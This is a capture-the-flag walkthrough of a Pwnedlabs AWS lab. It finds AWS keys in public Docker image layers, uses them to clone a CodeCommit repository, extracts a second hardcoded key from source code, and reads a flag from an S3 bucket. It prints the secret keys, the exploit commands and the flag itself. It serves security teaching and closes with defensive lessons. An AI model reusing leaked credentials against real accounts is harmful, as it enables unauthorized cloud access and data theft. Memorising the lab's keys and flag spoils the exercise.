# CTF Walkthrough: Uncover Secrets in CodeCommit and Docker

**Platform:** Pwnedlabs | **Challenge:** Uncover Secrets in CodeCommit and Docker | **Difficulty:** Medium | **Target:** AWS Environment

---

## Executive Summary

This lab demonstrates a critical supply-chain attack pattern where hardcoded AWS credentials are leaked through public Docker images on Docker Hub. The challenge starts with discovering a publicly accessible Docker image that contains build-time environment variables and AWS IAM credentials. By extracting and analyzing Docker image layers, we uncover two sets of AWS IAM keys. The first key grants access to AWS CodeCommit (the target repository), while the second key—hardcoded in application source code within CodeCommit—provides direct S3 access to retrieve the flag. The attack chain illustrates how container image misconfiguration and secrets management failures can escalate from reconnaissance to flag capture.

---

## Reconnaissance

### Entry Point: Docker Hub
**Objective:** Identify the target Docker image containing secrets.

The challenge begins with **https://hub.docker.com/search** as the entry point. A search for keywords related to the lab context (e.g., "vessel-tracking", "pwnedlabs") would reveal a publicly accessible Docker image that is vulnerable to secrets leakage.

**Discovery Method:**
- Docker Hub images are public and searchable
- Build images often contain environment variables and build artifacts
- Poorly configured Docker images expose sensitive data in layer history

### Docker Image Layer Analysis
**Objective:** Extract AWS credentials from image layers.

Once the target Docker image is identified on Docker Hub, we inspect its layer history using `docker history` or examine the image metadata:

```bash
# Pull the target image
docker pull <image-name>

# View layer history (includes ENV and RUN instructions)
docker history <image-name>

# Extract filesystem from specific layer
docker run --rm <image-name> sh -c 'env | grep AWS'
```

**Key Findings:**
- **AWS IAM Key (Production):** `AKIA3NRSK2PTOA5KVIUF` (Secret: `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`)
  - User: `prod-deploy` (ID: `AIDA3NRSK2PTAUXNEJTBN`)
  - AWS Account: `785010840550`
  - Region: `us-east-1`
  - Purpose: CodeCommit HTTPS authentication via credential-helper
  - Source: Docker image ENV/RUN layers (exposed in layer history)

**Exploitation:** This credential allows direct authentication to AWS CodeCommit repositories.

---

## AWS CodeCommit Access

### Authenticating to CodeCommit
**Objective:** Use the leaked IAM credentials to access the CodeCommit repository.

With the first IAM key, we can authenticate to AWS and access CodeCommit:

```bash
# Configure AWS CLI with the leaked credentials
export AWS_ACCESS_KEY_ID="AKIA3NRSK2PTOA5KVIUF"
export AWS_SECRET_ACCESS_KEY="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"
export AWS_DEFAULT_REGION="us-east-1"

# List available CodeCommit repositories
aws codecommit list-repositories

# Expected output will show: vessel-tracking repository
```

### Repository Discovery & Navigation
**Objective:** Clone the CodeCommit repository and identify credential hotspots.

```bash
# Clone the vessel-tracking repository
git clone codecommit://vessel-tracking

cd vessel-tracking

# List branches (e.g., dev, prod, main)
git branch -a

# Checkout dev branch (where hardcoded credentials are present)
git checkout dev
```

### Source Code Analysis
**Objective:** Search the codebase for hardcoded secrets.

Within the repository (specifically in the `dev` branch), examine the application source code:

**File:** `js/server.js` (commit: `b63f075`)

```javascript
// Hardcoded AWS credentials in source code
const AWS = require('aws-sdk');

const s3 = new AWS.S3({
  accessKeyId: 'AKIA3NRSK2PTLGAWWLTG',
  secretAccessKey: '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',
  region: 'us-east-1'
});

// S3 bucket for vessel tracking data
const BUCKET = 'vessel-tracking';
```

**Vulnerability:** Hardcoded AWS credentials in application source code.

**Key Extracted:** 
- **AWS IAM Key (Code-Admin):** `AKIA3NRSK2PTLGAWWLTG` (Secret: `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`)
  - User: `code-admin`
  - Purpose: S3 bucket access (vessel-tracking)
  - Scope: Can read/write to `s3://vessel-tracking/`

---

## Flag Retrieval

### S3 Bucket Enumeration
**Objective:** Use the second IAM key to access the S3 bucket and retrieve the flag.

```bash
# Configure AWS CLI with the code-admin credentials
export AWS_ACCESS_KEY_ID="AKIA3NRSK2PTLGAWWLTG"
export AWS_SECRET_ACCESS_KEY="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"
export AWS_DEFAULT_REGION="us-east-1"

# List S3 bucket contents
aws s3 ls s3://vessel-tracking/

# Expected output:
# 2026-04-05 12:00:00    4096 PRE vessel-id-ae/
# 2026-04-05 12:00:00    4096 PRE vessel-id-af/
# ...
# 2026-04-05 12:00:00     128 flag.txt
```

### Flag Extraction
**Objective:** Read the flag.txt file from the S3 bucket.

```bash
# Read the flag
aws s3 cp s3://vessel-tracking/flag.txt - 

# Or use s3api for direct access
aws s3api get-object --bucket vessel-tracking --key flag.txt flag.txt
cat flag.txt
```

**Flag Captured:** `ab53301c2382ec87ed6f9ff78fec4b76`

---

## Attack Chain Summary

```
[1] Docker Hub Public Image
    ↓
[2] Extract Environment Variables from Layers
    ↓
[3] Obtain AWS IAM Key (prod-deploy)
    ↓
[4] Authenticate to AWS CodeCommit
    ↓
[5] Clone vessel-tracking Repository
    ↓
[6] Analyze js/server.js (dev branch)
    ↓
[7] Extract Second AWS IAM Key (code-admin)
    ↓
[8] Access S3 Bucket (vessel-tracking)
    ↓
[9] Retrieve flag.txt
```

---

## Key Vulnerabilities Exploited

1. **Secrets in Docker Layers:** Hardcoded AWS credentials in Docker image ENV/RUN instructions exposed via public Docker Hub.
2. **IAM Key Exposure via CodeCommit:** First IAM key leaked through container image metadata, enabling repository access.
3. **Hardcoded Secrets in Source Code:** Second IAM key hardcoded directly in `js/server.js`, violating secure coding practices.
4. **Excessive IAM Permissions:** The `code-admin` IAM user likely has over-provisioned S3 access permissions.
5. **Lack of Secrets Rotation:** No evidence of credential rotation or use of temporary STS tokens.

---

## Lessons Learned

- **Use AWS Secrets Manager or Parameter Store** for sensitive credentials instead of hardcoding them.
- **Scan Docker images** for secrets before publishing to registries (use tools like `trivy`, `snyk`).
- **Implement IAM access controls** with least privilege principles.
- **Rotate credentials regularly** and retire leaked keys immediately.
- **Never commit secrets to version control**, even in private repositories (use `.gitignore` and pre-commit hooks).
- **Use temporary STS credentials** (AssumeRole) instead of long-term IAM access keys for applications.

---

## Flag

```
ab53301c2382ec87ed6f9ff78fec4b76
```

